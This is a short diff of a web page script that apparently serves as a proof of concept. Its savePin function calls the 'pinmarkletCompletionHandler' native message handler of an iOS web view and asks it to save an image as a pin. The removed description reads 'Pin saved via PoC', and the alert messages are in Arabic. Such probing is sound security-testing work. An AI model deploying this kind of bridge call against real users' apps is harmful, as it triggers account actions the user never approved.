@@ -78,12 +78,11 @@
 <script>
 function savePin() {
   try {
-    window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
-      action: "saveImage",
-      boardId: "813392451390311489",
-      imageUrl: "https://i.pinimg.com/400x300/00/93/17/0093176f8cab20b4cfe23a14a81ffd1d.jpg",
-      description: "Pin saved via PoC"
-    });
+   window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
+  action: "saveImage",
+  imageUrl: "https://i.pinimg.com/400x300/00/93/17/0093176f8cab20b4cfe23a14a81ffd1d.jpg"
+});
+
     alert("طلب حفظ pin تم إرساله");
   } catch(e) {
     alert("خطأ: " + e.message);
